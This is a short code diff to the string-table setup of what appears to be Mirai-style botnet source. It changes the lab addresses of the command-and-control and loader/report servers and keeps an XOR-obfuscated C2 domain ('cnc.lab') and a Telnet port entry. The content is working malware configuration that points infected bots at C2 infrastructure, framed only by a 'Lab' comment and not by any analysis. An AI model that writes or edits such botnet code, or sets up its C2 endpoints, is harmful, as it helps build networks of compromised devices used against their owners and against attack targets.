@@ -15,8 +15,8 @@ struct table_value table[TABLE_MAX_KEYS];
 
 void table_init(void)
 {
-    /* Lab: CNC 172.30.81.177  |  Loader/scanListen 185.10.30.10
-     * Resolve via /etc/hosts on bot: 172.30.81.177 cnc.lab  /  185.10.30.10 report.lab */
+    /* Lab: CNC 185.10.20.100  |  Loader/scanListen 185.10.20.200
+     * Resolve via /etc/hosts on bot: 185.10.20.100 cnc.lab  /  185.10.20.200 report.lab */
     add_entry(TABLE_CNC_DOMAIN, "\x41\x4C\x41\x0C\x4E\x43\x40\x22", 8); // cnc.lab
     add_entry(TABLE_CNC_PORT, "\x22\x35", 2);   // 23
 
